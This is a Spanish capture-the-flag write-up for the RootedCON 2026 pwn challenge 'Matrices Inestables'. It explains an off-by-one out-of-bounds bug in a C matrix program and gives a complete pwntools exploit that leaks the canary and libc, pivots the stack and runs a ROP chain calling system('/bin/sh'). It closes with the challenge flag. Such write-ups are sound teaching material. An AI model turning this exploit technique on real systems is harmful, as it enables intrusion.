# Matrices Inestables

> CTF Track Securiters - RootedCON 2026

> 27/02/2026 18:00 CEST - 01/03/2026 18:00 CEST

* Categoría: Pwn
* Autor: 7Rocky
* Dificultad: 2
* Etiquetas: OOB

## Descripción

He escrito un programa en C para multiplicar matrices, pero los resultados están mal

## Archivos

- `matrices-inestables`
- `libc.so.6`
- `ld-linux-s86-64.so.2`
- `Dockerfile`

## Resolución

Se presenta un programa que permite multiplicar dos matrices $A$ y $B$ y guardar el resultado en una matriz $C$.

### Ingeniería inversa

Por comodidad, muestro el código fuente original, ya que la descompilación de IDA, Ghidra y Binary Ninja será similar (aunque conviene hacer uso de estructuras para que las variables tengan sentido).

En el menú tenemos:

```c
puts("1. Definir A\n2. Definir B\n3. Calcular C = AB\n4. Mostrar C");
```

Y las matrices se guardan en una estructura de la siguiente forma:

```c
#define MAX 16

typedef struct matrix_t {
  unsigned int rows;
  unsigned int cols;
  unsigned char elements[MAX][MAX];
} matrix_t;
```

Aquí vemos que son matrices de bytes (enteros entre 0 y 255, ambos incluidos). Y además sabemos que la estructura tiene un tamaño de $4 + 4 + (1 \cdot 16) \cdot 16 = 264$ bytes.

La vulnerabilidad está presente en las tres funciones que operan con matrices. Por ejemplo, en `show`:

```c
void show(matrix_t* M) {
	printf("[");

  for (int i = 0; i <= M->rows; i++) {
		if (i) printf(", ");
    printf("[");

    for (int j = 0; j <= M->cols; j++) {
			if (j) printf(", ");
      printf("%hhu", M->elements[i][j]);
    }

    printf("]");
  }

	puts("]");
}
```

El problema está en los bucles `for`, ya que se itera desde índice `0` hasta índice igual a `M->rows` (o `M->cols`), lo que se conoce como _off-by-one_. Esto da lugar a una lectura fuera de los límites (OOB). En el caso de `read` y de `multiply`, se produce una escritura OOB.

En la función `main` se declaran las matrices de la siguiente forma:

```c
int main() {
  int option;
  matrix_t A, B, C;

  // ...
}
```

Por tanto, las tres estructuras están colocadas en la pila (_stack_) una detrás de otra, sin separación entre ellas.

### Estrategia de explotación

Al tener un bug de _off-by-one_ en el bucle que itera por las filas y el que itera por las columnas, el resultado es que se tienen 17 bytes adicionales fuera de la estructura `matrix_t`.

A partir de ahora emplearemos siempre matrices de $16 \times 16$. En este sentido, `A[0][16]` sería lo mismo que `A[1][0]`. Por tanto, los accesos OOB en las filas `0` a `15` no afectan mucho. Lo interesante es cuando se accede a una supuesta fila `16` (que no existe) y se escriben 17 bytes desde `A[16][0]` hasta `A[16][16]`.

Lo primero que podemos hacer es usar la matriz `B` para modificar las dimensiones de la matriz `V`, que se sitúa debajo en memoria. Con esto, nos aprovechamos de cómo se guarda el número de filas y de columnas en la estructura `matrix_t`. Si ponemos un tamaño suficientemente grande, luego podremos usar `show` para leer valores de la pila. Con esto, podremos encontrar direcciones de pila, del binario y de `libc.so.6`, además del canario.

Cabe mencionar que el binario cuenta con todas las protecciones habilitadas:

```console
$ checksec matrices-inestables
[*] './matrices-inestables'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Una vez que se tienen los _leaks_ necesarios para calcular las direcciones base de `libc.so.6` y del binario, lo siguiente es abusar del OOB en la matriz `C` para modificar la dirección de retorno. Resulta que con 17 bytes de desbordamiento, podemos pisar el canario (8 bytes), el valor guardado de `$rbp` y el valor guardado de `$rip` (solo 1 byte).

En este punto, hay que utilizar una técnica conocida como _Stack Pivot_ para poner en `$rbp` un valor donde podamos escribir y hacer que `$rip` apunte a una instrucción `leave; ret` o similar. En esta región donde podemos escribir, ponemos una cadena ROP para ejecutar `system("/bin/sh")`.

Lo único que queda es desarrollar el _exploit_ y ver cómo transformar la idea de ejecución de código arbitrario a una implementación con matrices, donde lo que queremos escribir es el resultado de multiplicar dos matrices.

### Desarrollo del exploit

Usaremos las siguientes funciones auxiliares:

```py
def send_matrix_A():
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Ingrese filas y columnas de la matriz (separados por espacio): ', f'{len(A) - 1} {len(A[0]) - 1}'.encode())
    io.sendlineafter(b'Introduce los valores para la matriz: ', str(A).encode())


def send_matrix_B():
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'Ingrese filas y columnas de la matriz (separados por espacio): ', f'{len(B) - 1} {len(B[0]) - 1}'.encode())
    io.sendlineafter(b'Introduce los valores para la matriz: ', str(B).encode())


def multiply():
    io.sendlineafter(b'> ', b'3')


def show() -> list[list[int]]:
    io.sendlineafter(b'> ', b'4')
    return ast.literal_eval(io.recvlineS())
```

Lo primero que podemos hacer es configurar las matrices `A` y `B` y modificar las dimensiones de `C` usando `B`:

```py
A, B = ([[0] * 17 for _ in range(17)] for _ in range(2))
B[-1][8] = B[-1][12] = 0x1f

send_matrix_A()
send_matrix_B()

C = show()
```

En este punto, tendremos muchos _leaks_ de memoria en `C` que tendremos que identificar y extraerlos cuidadosamente:

```py
canary = u64(bytes(C[16][:8]))
stack_addr = u64(bytes(C[16][8:16]))
__libc_start_main_addr = u64(bytes(C[17][:8])) + 0x36

io.info(f'Canary: {hex(canary)}')
io.info(f'Stack address: {hex(stack_addr)}')
io.info(f'__libc_start_main address: {hex(__libc_start_main_addr)}')

glibc.address = __libc_start_main_addr - glibc.sym.__libc_start_main
io.success(f'Glibc base address: {hex(glibc.address)}')
```

Con esto, ya podemos continuar a la siguiente parte para obtener ejecución de código arbitrario:

```py
rop = ROP(glibc)

A[-1][0] = 1

B[0][0:16] = list(p64(canary) + p64(stack_addr - 0x228))
B[1][0] = 0xc4

B[1][8:16] = list(p64(rop.find_gadget(['leave', 'ret']).address))  # -> stack_addr - 0x228

B[9][8:16] = list(p64(rop.rdi.address))
B[10][0:8] = list(p64(next(glibc.search(b'/bin/sh'))))
B[10][8:16] = list(p64(glibc.sym.system))

send_matrix_A()
send_matrix_B()

multiply()
```

La clave aquí es hacer que la matriz `A` sean todos `0` excepto un `1` en la primera columna de la última fila. Con esto, se consigue que los valores de la primera fila de `B` se copien a la última fila de `C` (OOB). El resto de valores se quedan en `B` para usarse con el _Stack Pivot_.

Finalmente, usamos la opción `0` para salir del programa y que se ejecute la cadena ROP:

```py
io.sendlineafter(b'> ', b'0')

io.interactive()
```

El _exploit_ completo es este:

```py
#/usr/bin/env python3

import ast

from pwn import context, ELF, ROP, p64, remote, sys, u64


context.binary = 'matrices-inestables'
glibc = ELF('libc.so.6', checksec=False)


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1], sys.argv[2]
    return remote(host, port)


def send_matrix_A():
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Ingrese filas y columnas de la matriz (separados por espacio): ', f'{len(A) - 1} {len(A[0]) - 1}'.encode())
    io.sendlineafter(b'Introduce los valores para la matriz: ', str(A).encode())


def send_matrix_B():
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'Ingrese filas y columnas de la matriz (separados por espacio): ', f'{len(B) - 1} {len(B[0]) - 1}'.encode())
    io.sendlineafter(b'Introduce los valores para la matriz: ', str(B).encode())


def multiply():
    io.sendlineafter(b'> ', b'3')


def show() -> list[list[int]]:
    io.sendlineafter(b'> ', b'4')
    return ast.literal_eval(io.recvlineS())


io = get_process()

A, B = ([[0] * 17 for _ in range(17)] for _ in range(2))
B[-1][8] = B[-1][12] = 0x1f

send_matrix_A()
send_matrix_B()

C = show()

canary = u64(bytes(C[16][:8]))
stack_addr = u64(bytes(C[16][8:16]))
__libc_start_main_addr = u64(bytes(C[17][:8])) + 0x36

io.info(f'Canary: {hex(canary)}')
io.info(f'Stack address: {hex(stack_addr)}')
io.info(f'__libc_start_main address: {hex(__libc_start_main_addr)}')

glibc.address = __libc_start_main_addr - glibc.sym.__libc_start_main
io.success(f'Glibc base address: {hex(glibc.address)}')

rop = ROP(glibc)

A[-1][0] = 1

B[0][0:16] = list(p64(canary) + p64(stack_addr - 0x228))
B[1][0] = 0xc4

B[1][8:16] = list(p64(rop.find_gadget(['leave', 'ret']).address))  # -> stack_addr - 0x228

B[9][8:16] = list(p64(rop.rdi.address))
B[10][0:8] = list(p64(next(glibc.search(b'/bin/sh'))))
B[10][8:16] = list(p64(glibc.sym.system))

send_matrix_A()
send_matrix_B()

multiply()
io.sendlineafter(b'> ', b'0')

io.interactive()
```

> **flag: clctf{4w3s0m3_O0B_r0p_w1th_s7ack_p1vo7!}**
